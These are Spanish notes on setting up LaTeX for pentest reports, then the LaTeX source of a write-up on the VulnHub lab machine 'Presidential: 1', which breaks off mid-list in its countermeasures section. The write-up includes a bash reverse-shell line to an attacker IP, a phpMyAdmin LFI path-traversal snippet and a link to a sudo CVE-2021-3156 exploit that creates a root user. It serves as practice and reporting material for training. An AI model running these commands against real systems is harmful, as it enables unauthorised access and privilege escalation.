
---
Tags: #latex #pdf #auditoria #pentesting

---
Apuntes orientados a auditorías de seguridad / pentesting. Pensados para trabajar de forma eficiente en Linux con `latexmk`, `zathura` y `nvim`.

---

## 1. Instalación del entorno

### Paquetes necesarios

```bash
sudo apt install latexmk zathura texlive-full
```

**Qué aporta cada uno:**

- **texlive-full**: distribución completa de LaTeX (clases, paquetes, fuentes).
    
- **latexmk**: automatiza la compilación (PDF, recompilaciones, errores).
    
- **zathura**: visor PDF ligero con recarga automática (ideal para LaTeX).
    

### Asociar Zathura como visor PDF por defecto

```bash
xdg-mime query default application/pdf
xdg-mime default zathura.desktop application/pdf
```

**Por qué:**

- `latexmk -pvc` abre el PDF con el visor por defecto.
    
- Zathura permite _live reload_ sin cerrar el documento.
    
- Evita visores pesados (Evince, Okular) durante edición continua.
    

---

## 2. Configuración de latexmk

### Configuración por usuario

Crear directorio:

```bash
mkdir -p ~/.config/latexmk
```

Archivo de configuración:

```bash
nano ~/.config/latexmk/latexmkrc
```

Contenido:

```perl
$pdf_previewer = "zathura";
```

### Usuario root

Opciones:

- Repetir la configuración en `/root/.config/latexmk/latexmkrc`
    
- O crear un enlace simbólico:
    

```bash
sudo mkdir -p /root/.config/latexmk
sudo ln -s /home/usuario/.config/latexmk/latexmkrc /root/.config/latexmk/latexmkrc
```

**Motivo:** `latexmk` no comparte configuración entre usuarios.

---

## 3. Estructura mínima de un documento

Ejemplo inicial:

```latex
\documentclass[a4paper]{article}

\usepackage[utf8]{inputenc}
\usepackage[spanish]{babel}

\begin{document}
Hola que tal probando
\end{document}
```

### Compilación

```bash
latexmk -pdf documento.tex
```

### Compilación + visualización continua

```bash
latexmk -pdf documento.tex -pvc
```

---

## 4. Librerías (paquetes) comunes en informes técnicos

```latex
\usepackage{geometry}      % Márgenes
\usepackage{graphicx}      % Imágenes
\usepackage{float}         % Control de posición
\usepackage{hyperref}      % Enlaces
\usepackage{listings}      % Código
\usepackage{xcolor}        % Colores
\usepackage{booktabs}      % Tablas profesionales
\usepackage{array}         % Columnas avanzadas
\usepackage{fancyhdr}      % Encabezados y pies
```

---

## 5. Cuadros (cajas de información)

### Caja simple

```latex
\fbox{Texto dentro del cuadro}
```

### Caja avanzada (recomendado)

```latex
\usepackage{tcolorbox}

\begin{tcolorbox}[title=Hallazgo crítico]
Descripción del problema de seguridad.
\end{tcolorbox}
```

Uso típico:

- Hallazgos
    
- Impacto
    
- Recomendaciones
    

---

## 6. Tablas y esquemas

### Tabla básica

```latex
\begin{tabular}{l l l}
Campo & Valor & Riesgo \\
IP & 10.10.10.10 & Alto \\
\end{tabular}
```

### Tabla profesional

```latex
\begin{tabular}{lll}
\toprule
Campo & Valor & Riesgo \\
\midrule
IP & 10.10.10.10 & Alto \\
Puerto & 445 & Crítico \\
\bottomrule
\end{tabular}
```

---

## 7. Medidas: ancho, alto y márgenes

### Márgenes del documento

```latex
\usepackage[a4paper,margin=2.5cm]{geometry}
```

### Control de ancho

```latex
\includegraphics[width=0.8\textwidth]{imagen.png}
```

Valores útiles:

- `\textwidth`
    
- `\linewidth`
    
- `cm`, `mm`, `in`
    

---

## 8. Código y comandos (pentesting)

```latex
\usepackage{listings}

\lstset{
  basicstyle=\ttfamily\small,
  breaklines=true,
  frame=single
}

\begin{lstlisting}
nmap -sC -sV 10.10.10.10
\end{lstlisting}
```

---

## 9. Estructura típica de informe de auditoría

- Portada
    
- Resumen ejecutivo
    
- Alcance
    
- Metodología
    
- Hallazgos
    
- Evidencias
    
- Impacto
    
- Recomendaciones
    
- Conclusiones
    

---

## 10. Tu ejemplo base (sin rellenar)

```latex
\documentclass[a4paper,11pt]{article}

% Paquetes
\usepackage[utf8]{inputenc}
\usepackage[spanish]{babel}
\usepackage[a4paper,margin=2.5cm]{geometry}
\usepackage{graphicx}
\usepackage{hyperref}
\usepackage{listings}
\usepackage{xcolor}
\usepackage{tcolorbox}

\title{Informe de Auditoría}
\author{}
\date{}

\begin{document}
\maketitle

\section{Resumen Ejecutivo}

\section{Alcance}

\section{Metodología}

\section{Hallazgos}

\section{Recomendaciones}

\end{document}
```

---

## 11. Plantilla reutilizable para informes

Pensada para copiar a cualquier máquina.

```latex
\documentclass[a4paper,11pt]{article}

\usepackage[utf8]{inputenc}
\usepackage[spanish]{babel}
\usepackage[a4paper,margin=2.5cm]{geometry}
\usepackage{graphicx}
\usepackage{hyperref}
\usepackage{booktabs}
\usepackage{listings}
\usepackage{xcolor}
\usepackage{tcolorbox}
\usepackage{fancyhdr}

\pagestyle{fancy}
\fancyhf{}
\rhead{Auditoría de Seguridad}
\lhead{Cliente}
\rfoot{\thepage}

\begin{document}

\begin{titlepage}
\centering
{\Huge Informe de Auditoría de Seguridad\\}
\vspace{2cm}
{\Large Cliente}
\vfill
{\large Fecha}
\end{titlepage}

\tableofcontents
\newpage

\section{Resumen Ejecutivo}

\section{Alcance}

\section{Metodología}

\section{Hallazgos}

\section{Recomendaciones}

\section{Conclusiones}

\end{document}
```


---

## Ejemplo máquina Presidential - 1 de vulnhub

```nvim
\documentclass[a4paper]{article} % Formato de plantilla que vamos a utilizar





\usepackage[utf8]{inputenc} % Para usar caracteres especiales
\usepackage[spanish]{babel} % Para usar caracteres especiales
\usepackage[margin=2cm, top=2cm, includefoot]{geometry} % Para establecer margenes en el documento
\usepackage{graphicx} % Para insertar imagenes
\usepackage[table,xcdraw]{xcolor} % Para representar colores
\usepackage{tikz, lipsum, lmodern} % Para la creacón de cajas
\usepackage[most]{tcolorbox} % Para la incorporacion de colores en la caja
\usepackage{fancyhdr}
\usepackage[hidelinks]{hyperref} % Para añadir hipervínculos y ocultarlos
\usepackage{setspace} % Paquete para separaciones (Usado para separación entre lineas)
\usepackage{parskip} % Para arreglar la forma en la que se manejan dos parrafos en el texto (Quitar espaciado entre párrafos)
\usepackage[figurename=Imagen]{caption} % Para cambiar el nombre del caption donde pone figura
\usepackage{ragged2e} % Para el \Justifying
\usepackage{listings} % Para la insersión de código

% Declaracion de variables globales

                                        % Variables Code Listings

\definecolor{codegreen}{rgb}{0,0.6,0}
\definecolor{codegray}{rgb}{0.5,0.5,0.5}
\definecolor{codepurple}{rgb}{0.58,0,0.82}
\definecolor{backcolour}{rgb}{0.95,0.95,0.92}

\lstdefinestyle{mystyle}{
    backgroundcolor=\color{backcolour},   
    commentstyle=\color{codegreen},
    keywordstyle=\color{magenta},
    numberstyle=\tiny\color{codegray},
    stringstyle=\color{codepurple},
    basicstyle=\ttfamily\footnotesize,
    breakatwhitespace=false,         
    breaklines=true,                 
    captionpos=b,                    
    keepspaces=true,                 
    numbers=left,                    
    numbersep=5pt,                  
    showspaces=false,                
    showstringspaces=false,
    showtabs=false,                  
    tabsize=2
}

\lstset{style=mystyle}

                                        % Fin variables Code Listings

% imagenes
\newcommand{\logoPortada}{images/vulnhub.png}
\newcommand{\logoCasablanca}{images/casablanca.jpeg}

                                        % EMPRESAS

\newcommand{\logoMiEmpresa}{images/logoMiEmpresa.jpeg} % MI EMPRESA
\newcommand{\logoEmpresaAuditada}{images/vulnhub.png} % EMPRESA AUDITADA

                                        % HERRAMIENTAS DE RECONOCIMIENTO

                % PUERTOS Y SERVICIOS

\newcommand{\nmapPuertos}{images/nmapPuertos.jpeg} % CAPTURA DE NMAP QUE MUESTRA PUERTOS Y SERVICIOS ACTIVOS

                % SERVICIOS WEB TECNOLOGIAS

\newcommand{\webPresidential}{images/webPresidential.jpg} % SERVICIO WEB EMPRESA AUDITADA
\newcommand{\panelAutenticacion}{images/panelAutenticacion.jpg}

\newcommand{\whatweb}{images/whatweb.jpg} % CAPTURA DE WHATWEB QUE MUESTRA LAS TECNOLOGIAS USADAS EN EL SERVICIO WEB
\newcommand{\wig}{images/wig.jpg} % CAPTURA DE WIG SIMILAR a WHATWEB

                % SERVICIOS WEB SUBDOMINIOS

\newcommand{\gobusterSubdominios}{images/gobusterSubdominios.jpg} % HERRAMIENTA GOBUSTER PARA BUSCAR SUBDOMINIOS

        % /ETC/HOSTS

\newcommand{\etcHosts}{images/hosts.jpg} % ARCHIVO /ETC/HOSTS

                % SERVICIOS WEB DIRECTORIOS

\newcommand{\gobusterDirectorios}{images/gobusterDirectorios.jpg} % HERRAMIENTA GOBUSTER PARA BUSCAR DIRECTORIOS

                                        % EXPLOTACION - VULNERABILIDADES

        % VULNERABILIDADES

\newcommand{\vulnerabilidades}{images/vulnerabilidades.jpg}


% palabras/conceptos

\newcommand{\nombreMaquina}{Presidential: 1}
\newcommand{\fechaComienzo}{16 de Diciembre de 2025}

% Colores

\definecolor{azulPortada}{HTML}{146c8a}

% Estilos

\setlength{\headheight}{60pt}  % Altura total del header
\setlength{\headsep}{20pt}     % Separación entre header y texto
\setlength{\parindent}{0pt}
\setlength{\parskip}{0.8em plus 0.5em minus 0.2em} % Estables espacio entre párrafos en 1em
\setlength{\parfillskip}{\parindent plus 1fill}

\pagestyle{fancy}
\fancyhf{}

\lhead{\raisebox{-0.3cm}{\includegraphics[height=1.8cm]{\logoMiEmpresa}}}
\rhead{\includegraphics[height=1.2cm]{\logoEmpresaAuditada}}

\renewcommand{\headrulewidth}{0.4pt}

\setstretch{1.2} % Para añadir un poco más de separación entre lineas

\begin{document}
        \cfoot{\thepage}
        \begin{titlepage}
                \centering
                \includegraphics[width=\textwidth]{\logoPortada}\par\vspace{0.4cm}
                {\scshape\LARGE \textbf{Informe Técnico}}\par\vspace{0.4cm}
                {\Huge\textcolor{azulPortada}{\textbf{Máquina {\nombreMaquina}}}}\par\vspace{1cm }

                \vfill
                \includegraphics[width=\textwidth]{\logoCasablanca}

                \vfill
                \begin{tcolorbox}[colback=red!5!white,colframe=red!75!black]
                        \centering
                        Documento realizado por Luis Rodríguez Hernández
                \end{tcolorbox}
                \vfill

                \large{\fechaComienzo}

        \end{titlepage}

% ----------------------------------------------------------------------------------------------------------------- 1
        % Indice

        \clearpage
        \tableofcontents
        \clearpage

% ----------------------------------------------------------------------------------------------------------------- 2

        \section{Antecedentes}
El presente documento recoge los resultados obtenidos durante la fase de auditoría realizada a la máquina \textbf{\nombreMaquina}, enumerando todos los vectores de ataque encontrados así como la explotación realizada para cada uno de ellos.

        Esta máquina ha sido descargada de la plataforma \href{https://vulnhub.com}{\textbf{\color{azulPortada}Vulnhub}}, una plataforma de entretenimiento y práctica para personas interesadas en la seguridad informática y hacking ético.

        A continuación, se proporciona el enlace directo de descarga de la máquina:

        \begin{tcolorbox}[enhanced, attach boxed title to top center={yshift=-3mm,yshifttext=-1mm},
                colback=blue!5!white,colframe=blue!75!black,colbacktitle=azulPortada!80!black,title=Dirección URL,fonttitle=\bfseries,
                boxed title style={size=small, colframe=red!50!black} ]
                \centering
                \href{https://www.vulnhub.com/entry/presidential-1,500/}{\textbf{\color{azulPortada}https://www.vulnhub.com/entry/presidential1,500}}
        \end{tcolorbox}

        \begin{figure}[h]

                \centering
                \setlength{\fboxrule}{0.8pt}
                \fbox{\includegraphics[width=\textwidth]{\webPresidential}}
                \caption{Página principal del servicio web de la máquina}
        \end{figure}

        \section{Objetivos}
                Los objetivos de la presente auditoría de seguridad se enfocan en la identificación de posibles vulnerabilidades y debilidades de la máquina \textbf{\color{azulPortada}\nombreMaquina} con el propósito de garantizar la integridad y confidencialidad de la información almacenada en ella.

                Con este fin, se ha llevado a cabo un análisis exhaustivo de todos los servicios detectados que se encontraban expuestos en dicho servidor, recopilando información detallada sobre aquellos que representan un riesgo potencial desde el punto de vista de la seguridad.

        \clearpage

        \subsection{Alcance}
                A continuación, se representan los objetivos a cumplir en esta auditoría:

                \begin{itemize}
                        \item Identificar los puertos y servicios vulnerables
                        \item Realizar una explotación de las vulnerabilidades encontradas
                        \item Conseguir acceso al servidor mediante la explotación de los servicios vulnerables identificados
                        \item Enumerar vías potenciales de elevar privilegios en el sistema una vez ha sido vulnerado
                \end{itemize}

        \subsection{Impedimentos y limitaciones}

                Durante el proceso de auditoría, esta terminantemente prohibido realizar alguna de las siguientes actividades:

                \begin{itemize}
                        \item Realizar tareas que puedan ocasionar una \textbf{denegación de servicio} o afectar a la disponibilidad de los servicios expuestos
                        \item Borrar archivos residentes en el servidor una vez este haya sido vulnerado
                \end{itemize}

        \subsection{Resumen general}


                \section{Resumen}

Durante la auditoría realizada a la máquina \textbf{\nombreMaquina}, se identificaron y explotaron diversas vulnerabilidades que permitieron obtener acceso no autorizado y escalar privilegios en el sistema. Los hallazgos más relevantes incluyen:

\begin{itemize}
    \item \textbf{PhpMyAdmin 4.8.1 vulnerable:} Se encontró una vulnerabilidad de tipo LFI que permitió la ejecución remota de código, comprometiendo la integridad del servidor y la base de datos.
    \item \textbf{Archivo backup expuesto:} Un archivo de configuración de base de datos accesible públicamente contenía credenciales reutilizables, facilitando el acceso al panel de PhpMyAdmin.
    \item \textbf{Escalada de privilegios mediante sudo 1.8.23:} La versión vulnerable de sudo (CVE-2021-3156) permitió a un usuario local no privilegiado crear un usuario con UID 0, obteniendo privilegios de root.
\end{itemize}

\textbf{Impacto:}
\begin{itemize}
    \item Acceso completo a la base de datos y al servidor.
    \item Posibilidad de comprometer la integridad y confidencialidad de la información.
    \item Riesgo de persistencia y escalada de privilegios por parte de un atacante.
\end{itemize}

\textbf{Recomendaciones principales:}
\begin{itemize}
    \item Actualizar PhpMyAdmin a la versión más reciente y restringir la inclusión de archivos mediante listas blancas.
    \item Remover o proteger archivos de configuración y backups accesibles públicamente.
    \item Actualizar sudo a la versión 1.9.17p2 o superior y auditar regularmente el archivo \texttt{/etc/sudoers}.
    \item Implementar monitoreo y alertas sobre el uso de privilegios elevados y actividades anómalas en el sistema.
\end{itemize}

En resumen, la combinación de vulnerabilidades en aplicaciones web y en el sistema operativo permitió un compromiso completo del servidor. La aplicación inmediata de las contramedidas propuestas es crítica para reducir el riesgo de explotación futura.



        \clearpage

        \section{Reconocimiento}
                \subsection{Enumeración de servicios expuestos}

                        A continuación, se adjunta una evidencia de los puertos y servicios identificados durante el reconocimiento aplicado con la herramienta \textbf{Nmap}:

                        \begin{figure}[h]

                        \centering
                        \setlength{\fboxrule}{0.8pt}
                        \fbox{\includegraphics[width=\textwidth]{\nmapPuertos}}
                        \caption{Puertos abiertos en la máquina}
                        \end{figure}

                        \vspace{0.3cm}

                        En este caso se descubrieron 2 puertos activos corriendo por el protocolo TCP:

                        \vspace{0.5cm}

                        \centering
                        \begin{tikzpicture}[node distance=2cm, every node/.style={rectangle, draw, fill=white}]
                                \node (center) {TCP};
                                \node (port1) [below left of=center, node distance=3cm] {Puerto 80};
                                \node (port2) [below right of=center, node distance=3cm] {puerto 2082};
                                \draw (center) -- (port1);
                                \draw (center) -- (port2);

                        \end{tikzpicture}

                        \vspace{0.5cm}

                        \justifying  % Para quitar el \centering

                        Asimismo, no se encontraron puertos expuestos a través de otros protocolos, por lo que se priorizará la evaluación de los puertos identificados en el primer escaneo efectuado.

        \clearpage

                \subsection{Enumeración de servidores web}
                        A continuación, se representa los resultados obtenidos con la herramienta \textbf{WhatWeb}, una herramienta de reconocimiento que se utiliza para identificar tecnologías web especificas que se emplean en un sitio web, tras aplicar un reconocimiento sobre el servicio HTTP corriendo por el puerto 80:

                        \begin{figure}[h]

                        \centering
                        \setlength{\fboxrule}{0.8pt}
                        \fbox{\includegraphics[width=\textwidth]{\whatweb}}
                        \caption{Enumeración del servicio HTTP por el puerto 80}
                        \end{figure}

                        En los resultados obtenidos, es posible identificar las versiones para algunas tecnologías existentes


                        \vspace{0.4cm}
                        \centering
                        \begin{tabular}{ c | c }
                                \textbf{Tecnología} & \textbf{Versión} \\
                                \hline
                                PHP & 5.5.38 \\
                                Apache & 2.4.6
                        \end{tabular}
                        \vspace{0.4cm}

                \justifying

                Dentro de la información representada, también es posible identificar 2 correos electrónicos, los cuales podrían ser utilizados de cara a un ataque de \textbf{Phishing}:

                \vspace{0.3cm}

                \begin{center}

                        \texttt{contact@example.com \qquad} \texttt{contact@votenow.local}

                \end{center}

                \vspace{0.3cm}

                El \textbf{Phishing} es un tipo de ataque informático que se utiliza para engañar a las personas y obtener información confidencial, como contraseñas información bancaria, o detalles de tarjetas de crédito. El ataque se lleva a cabo mediante el envío de correos electrónicos fraudulentos o mensajes de texto que parecen legítimos y que solicitan al destinatario información personal o confidencial.

                Adicionalmente, también se ha logrado identificar la versión de \textbf{CentOS} que se encuentra activa a través de un reconocimiento exhaustivo realizado sobre el servidor web con la herramienta \textbf{Wig}.

                \begin{figure}[h]

                        \centering
                        \setlength{\fboxrule}{0.8pt}
                        \fbox{\includegraphics[height=8cm, keepaspectratio]{\wig}}
                        \caption{Enumeración del servicio HTTP por el puerto 80}
                \end{figure}

        \clearpage

        \subsection{Enumeración de subdominios}

        Una vez identificado el dominio '\textbf{votenow.local}' gracias a los correos electrónicos, se procedió a aplicar un ataque de fuerza bruta sobre el dominio principal con el objetivo de identificar subdominios válidos.

        Una vez finalizado el ataque de fuerza bruta, estos fueron los resultados obtenidos:

                \begin{figure}[h]

                        \centering
                        \setlength{\fboxrule}{0.8pt}
                        \fbox{\includegraphics[width=\textwidth]{\gobusterSubdominios}}
                        \caption{Subdominios identificados por la herramienta Gobuster}
                        \label{fig:gobuster-subdominios}
                \end{figure}

                \vspace{0.3cm}

                Se identificó el subdominio '\textbf{datasafe.votenow.local}' como un subdominio válido. Este subdomnio representó un punto crucial en la auditoría, dado que fue a través de este, que se consiguió ingresar al sistema mediante la explotación de una vulnerabilidad existente en \textbf{PhpMyAdmin}.

                Cabe destacar que para que estos dominios y subdominios fueran accesibles fue necesario incorporar el siguiente contenido en el archivo \textbf{/etc/hosts}.


                \begin{figure}[h]

                        \centering
                        \setlength{\fboxrule}{0.8pt}
                        \fbox{\includegraphics[width=\textwidth]{\etcHosts}}
                        \caption{Incorporación de subdominios al archivo /etc/hosts}
                        \label{fig:/etc/hosts-subdominios}
                \end{figure}

                Esto es así, dado que se está aplicando '\textbf{Virtual Hosting}', una técnica utilizada en servidores web para alojar múltiples sitios web en una sola máquina física. El archivo '\textbf{/etc/hosts}' se utiliza para asociar el nombre de dominio de cada sitio web con la dirección IP del servidor.

                Si no se especifica esta asociación, el servidor web no podrá determinar el sitio web correcto para servir, respondiendo así con un error o sitio web incorrecto.

                \subsection{Enumeración de paneles de autenticación}

                        Una vez descubierto el subdominio '\textbf{datasafe.votenow.local}', representado en la imagen \href{fig:gobuster-subdominios} de la página \pageref{fig:gobuster-subdominios}, se encontró el siguiente panel de autenticación de \textbf{PhpMyAdmin}:


                        \begin{figure}[h]
                                \centering
                                \setlength{\fboxrule}{0.8pt}
                                \fbox{\includegraphics[width=\textwidth]{\panelAutenticacion}}
                                \caption{Panel de autentiación de PhpMyAdmin}
                                \label{fig:panelAutenticacion}
                        \end{figure}


        \section{Identificación y explotación de vulnerabilidades}
                \subsection{Archivo backup expuesto}

                        Durante una fase de reconocimiento con la herramienta \textbf{gobuster}, una herramienta de línea de comandos de código abierto que se utiliza para buscar y enumerar recursos web en servidores y sitios web, se identificó un archivo de backup expuesto en el servidor

                        \begin{figure}[h]

                                \centering
                                \setlength{\fboxrule}{0.8pt}
                                \fbox{\includegraphics[width=\textwidth]{\gobusterDirectorios}}
                                \caption{Escaneo de directorios con la herramienta Gobuster}
                                \label{fig:gobuster-directorios}
                        \end{figure}

        \clearpage

                        Este archivo fué descargado con el objetivo de validar si este disponía de información sensible la cual pudiera suponer un riesgo desde el punto de vista de la seguridad. En este punto, se determinó que contaba con la siguiente información privilegiada:

                        \vspace{0.5cm}

                        \begin{figure}[h]

                                \centering
                                \setlength{\fboxrule}{0.8pt}
                                \fbox{\includegraphics[width=12cm, keepaspectratio]{images/credenciales.jpg}}
                                \caption{Imagen del contenido del archivo config.php.bak}
                                \label{fig:credenciales}
                        \end{figure}

                        \vspace{0.5cm}

                        Estas credenciales pertenecen a la base de datos, las cuales a su vez, debido a una reutilización de usuario y contraseña, permitieron ingresar al panel de autenticación de \textbf{PhpMyAdmin} representado en la imagen \ref{fig:panelAutenticacion} de la pagina \pageref{fig:panelAutenticacion}.

                        \begin{figure}[h]

                                \centering
                                \setlength{\fboxrule}{0.8pt}
                                \makebox[\textwidth]{\fbox{\includegraphics[width=0.85\paperwidth]{images/panelAutenticado.jpg}}}
                                \caption{Inicio de sesión exitoso en PhpMyAdmin}
                                \label{fig:panel-autenticado}
                        \end{figure}


        \clearpage

                \subsection{Explotación del PhpMyAdmin}

                        Una vez ingresado al \textbf{PhpMyAdmin}, fue posible identificar la versión actualmente en uso:

                        \vspace{0.2cm}

                        \begin{figure}[h]

                                \centering
                                \setlength{\fboxrule}{0.8pt}
                                \fbox{\includegraphics[width=12cm, keepaspectratio]{images/versionPhpmyadmin.jpg}}
                                \caption{Versión de PhpMyAdmin en uso}
                                \label{fig:versionphpmyadmin}
                        \end{figure}

                        \vspace{0.3cm}

                        Esta versión corresponde a una versión antigua lo que lo expone a varias \textbf{vulnerabilidades críticas} identificadas:

                        \begin{figure}[h]

                                \centering
                                \setlength{\fboxrule}{0.8pt}
                                \fbox{\includegraphics[width=\textwidth]{\vulnerabilidades}}
                                \caption{Imagen de vulnerabilidades de la versión 4.8.1 de PhpMyAdmin}
                                \label{fig:credenciales}
                        \end{figure}

                        \vspace{0.3cm}

                        Entre ellas, una la cual permite a un atacante \textbf{ejecutar código remoto} en el servidor.

        \clearpage


                        A continuación se comparte el script en Python3 el cual fue empleado para ejecutar comandos remotos en el servidor:

                        \vspace{0.3cm}

                        \lstinputlisting[language=Python, caption=Exploit para la versión vulnerable de PhpMyAdmin]{phpmyadmin_exploit.py}




        \clearpage
        \begin{center}

                        En este caso, se está ejecutando un comando que, mediante \texttt{curl}, interpreta un script en Bash el cual dispone del siguiente contenido:

                \begin{lstlisting}[language=bash,caption={Script en Bash para establecer la conexión}]
#!/bin/bash

bash -i >& /dev/tcp/192.168.111.45/443 0>&1

                \end{lstlisting}

                        Este script está alojado en el servidor del atacante, evitando de esta forma dejar archivos residuales en el servidor víctima. Una vez ejecutado el comando, el atacante gana acceso al servidor, teniendo control de la máquina, en este caso, como el usuario \texttt{apache}.

                        Tal y como se puede apreciar en el script, principalmente lo que sucede es que el código se aprovecha de una vulnerabilidad de tipo \textbf{LFI} existente en esta versión de \textit{phpMyAdmin} para conseguir la ejecución remota de comandos.

                \begin{lstlisting}[language=python,caption={Porción del código correspondiente a la explotación del LFI}]

session_id = cookies.get_dict()['phpMyAdmin']
url3 = url + "/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_{session_id}"
r = requests.get(url3, cookies=cookies)

                \end{lstlisting}
        \end{center}


\bigskip


                        \begin{center}
                        \colorbox{cyan!20}{
                        \parbox{0.95\linewidth}{
                        \textbf{Definición}

\medskip

                        \textbf{LFI (Local File Inclusion)} es una vulnerabilidad de seguridad en aplicaciones web que permite que un atacante pueda acceder a archivos locales del servidor a través de la inclusión de archivos locales en una página web.
}}

                        \end{center}

\clearpage

                        A través de LFI, se consigue apuntar a un recurso el cual almacena sesiones que representan información relaccionada con las diferentes sesiones activas en el uso del lado de los usuarios.


                        Aprovechando esta lectura y la propia sesión del usuario, lo que se hace es que a través de una query SQL, se logra introducir una consulta la cual contiene código PHP, visible desde los archivos de sesión del usuario a través del LFI. Esto en consecuencia conduce a una ejecución remota de comandos, dado que el código PHP es interpretado por el servidor.


\section{Escalada de privilegios}


Aunque el binario \texttt{/usr/bin/sudo} dispone del bit SUID activo, el usuario comprometido
no contaba con permisos legítimos para ejecutar comandos mediante \texttt{sudo}, ni figuraba
en el fichero \texttt{/etc/sudoers}. En condiciones normales, el uso de \texttt{sudo} requiere
autenticación y autorización explícita.

Sin embargo, al comprobar la versión instalada se observó que el sistema utilizaba
\texttt{sudo 1.8.23}, una versión vulnerable a \textbf{CVE-2021-3156 (Baron Samedit)}.
Esta vulnerabilidad permite a un usuario local no privilegiado explotar un desbordamiento
de memoria en el heap, logrando la ejecución de código arbitrario con privilegios de
superusuario sin necesidad de autenticación previa.

Por tanto, la escalada de privilegios no se produce debido a una mala configuración de
permisos, sino a una vulnerabilidad en el propio binario \texttt{sudo}.


Tras verificar la versión instalada ejecutando:

% Aquí puedes insertar una figura con la salida de sudo --version
\begin{figure}[h]
    \centering
    \includegraphics[width=0.7\textwidth]{images/sudoversion.jpg}
    \caption{Versión de \textbf{sudo} en el sistema.}
\end{figure}

se determinó que la versión instalada era la \textbf{1.8.23}. Esta versión es vulnerable a la vulnerabilidad \textbf{CVE-2021-3156}, conocida como \emph{Baron Samedit}.  

\subsection{Detalles de la vulnerabilidad}

La vulnerabilidad se encuentra en \texttt{sudoedit} y afecta al manejo de argumentos de línea de comandos cuando se usan múltiples barras invertidas (\texttt{\textbackslash}) o ciertos caracteres de escape. El problema principal es un \textbf{desbordamiento de heap} que permite sobrescribir estructuras internas en memoria, específicamente la \texttt{struct userspec}.  

La estructura \texttt{userspec} en sudo contiene información crítica sobre usuarios, grupos y privilegios asociados. Mediante este desbordamiento, un atacante puede:

\begin{itemize}
    \item Evadir la autenticación normal de sudo.
    \item Modificar o inyectar nuevas entradas en las listas de usuarios con privilegios.
    \item Tomar control de la ejecución de comandos con UID 0 (root), independientemente de la contraseña original.
\end{itemize}

La explotación requiere conocimiento de la disposición del heap de sudo y del tamaño de los comandos que se procesan, por lo que muchos exploits incluyen un proceso de \emph{bruteforce} para calcular los offsets correctos antes de sobrescribir la estructura.

\subsection{Explotación con script Python}

Para este sistema se utilizó un \textbf{script en Python} que aprovecha la vulnerabilidad. Este script automatiza los pasos necesarios para sobrescribir la estructura \textbf{userspec} y crear un nuevo usuario privilegiado. En nuestro caso, el script añade:

\begin{itemize}
    \item Usuario: \textbf{gg}
    \item Contraseña: \textbf{gg}
    \item UID: 0 (equivalente a root)
    \item GID: 0
    \item Directorio home: \textbf{/root}
    \item Shell: \textbf{/bin/bash}
\end{itemize}

Esto permite al usuario normal escalar sus privilegios a root sin necesidad de conocer ninguna contraseña preexistente, aprovechando únicamente la vulnerabilidad de sudo.

% Sección para insertar el código del script
\subsection{Código del exploit}

\begin{tcolorbox}[enhanced, attach boxed title to top center={yshift=-3mm,yshifttext=-1mm},
                colback=blue!5!white,colframe=blue!75!black,colbacktitle=azulPortada!80!black,title=Dirección URL,fonttitle=\bfseries,
                boxed title style={size=small, colframe=red!50!black} ]
                \centering
                \href{https://raw.githubusercontent.com/worawit/CVE-2021-3156/refs/heads/main/exploit\_userspec.py}{\textbf{\color{azulPortada}https://raw.githubusercontent.com/worawit/CVE-2021-3156/refs/heads/main/exploit\_userspec.py}}
        \end{tcolorbox}



\subsection{Ejecución del exploit}

% Figura de la ejecución del script
\begin{figure}[h]
    \centering
    \includegraphics[width=0.7\textwidth]{images/ejecucionexploit1.jpg}
    \caption{Ejecución del exploit para crear usuario con privilegios.}
\end{figure}


% Figura de la ejecución del script
\begin{figure}[h]
    \centering
    \includegraphics[width=0.7\textwidth]{images/ejecucionexploit2.jpg}
    \caption{Ejecución del exploit para crear usuario con privilegios.}
\end{figure}



\subsection{Consola con usuario privilegiado}

                Una vez creado el usuario con el script de python que hemos utilizado, podemos ejecutar el comando \textbf{su gg} para entrar como usuario privilegiado gg y ya tendriamos la escalada de privilegios efectuada.

% Figura mostrando la shell con el usuario gg
\begin{figure}[h]
    \centering
    \includegraphics[width=0.7\textwidth]{images/consolaprivilegiada.jpg}
    \caption{Shell como usuario \texttt{gg} con UID 0.}
\end{figure}



\section{Contramedidas y buenas prácticas}

                        Con el objetivo de evitar posibles explotaciones indeseadas en el servidor expuesto, se enumeran a continuación las buenas prácticas a llevar a cabo para las diferentes vulnerabilidades descubiertas.

                \subsection{PhpMyAdmin 4.8.1 vulnerable}

                        PhpMyAdmin es una herramienta popular para administrar bases de datos MySQL a través de una interfaz web. Sin embargo, la versión 4.8.1 de PhpMyAdmin tiene una vulnerabilidad conocida que permite a un atacante ejecutar código arbitrario en el servidor web donde esta alojado.

                        Para corregir esta vulnerabilidad es necesario actualizar la versión más reciente de PhpMyAdmin (actualmente, la versión 5.2.3). Si por alguna razón no es posible actualizar a la última versión, se pueden tomar algunas medidas para mitigar el riesgo de explotación:

                        \begin{itemize}

                                \item Corregir el código de '\textbf{index.php}' para que la variable '\textbf{target}' proporcionada por el usuario este bien controlada


                        \end{itemize}


                        \vspace{0.5cm}

                        \begin{figure}[h]
                        \centering
                                \setlength{\fboxrule}{0.8pt}
                                \fbox{\includegraphics[width=0.9\textwidth]{images/solucion_phpmyadmin.png}}
                                \caption{Parámetro target vulnerable a LFI}
                        \end{figure}


                        \begin{itemize}
                                \item En lugar de permitir que el usuario especifique cualquier archivo que desee incluir, definir una lista de archivos permitidos y comprobar que el valor pasado al parámetro '\textbf{target}' esté en la lista antes de incluir el archivo

                        \end{itemize}


                \subsection{sudo 1.8.23 vulnerable}

Sudo es una utilidad que permite a usuarios ejecutar comandos con privilegios de otros usuarios (normalmente root) de forma controlada. La versión 1.8.23 de sudo contiene vulnerabilidades conocidas (CVE-2019-14287 y otras similares) que pueden permitir a un atacante ejecutar comandos con privilegios de root incluso si no tiene permisos completos, aprovechando errores en la validación de los IDs de usuario.

\textbf{Riesgos:}
\begin{itemize}
    \item Escalada de privilegios local: un usuario con acceso limitado podría ejecutar comandos como root.
    \item Posibilidad de comprometer la integridad del sistema, incluyendo modificación de archivos críticos y obtención de contraseñas.
    \item Afecta la seguridad de cualquier servicio que dependa de sudo para separación de privilegios.
\end{itemize}

\textbf{Medidas de mitigación:}
\begin{itemize}
    \item Actualizar sudo a la versión más reciente disponible (actualmente 1.9.17p2) para corregir las vulnerabilidades conocidas.
    \item Revisar y limitar el archivo \texttt{/etc/sudoers}:
        \begin{itemize}
            \item Evitar configuraciones que permitan el uso de ``ALL`` para usuarios no confiables.
